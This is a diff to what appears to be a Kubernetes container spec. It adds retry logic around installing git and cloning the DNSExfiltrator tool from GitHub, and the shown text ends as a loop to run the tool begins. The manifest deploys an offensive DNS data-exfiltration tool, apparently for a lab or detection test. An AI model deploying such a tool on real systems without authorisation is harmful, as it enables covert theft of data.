@@ -45,9 +45,22 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
             - |
-              apk add --no-cache git
+              for i in 1 2 3 4 5; do
+                apk add --no-cache git && break
+                echo "apk add failed (attempt $i/5), retrying in 10s..."
+                sleep 10
+              done
+              if ! command -v git >/dev/null 2>&1; then
+                echo "FATAL: git not installed after 5 attempts"
+                sleep 3600
+                exit 1
+              fi
               if [ ! -d DNSExfiltrator ]; then
-                git clone --depth 1 https://github.com/Arno0x/DNSExfiltrator.git
+                for i in 1 2 3; do
+                  git clone --depth 1 https://github.com/Arno0x/DNSExfiltrator.git && break
+                  echo "git clone failed (attempt $i/3), retrying in 10s..."
+                  sleep 10
+                done
               fi
               cd DNSExfiltrator
               while true; do
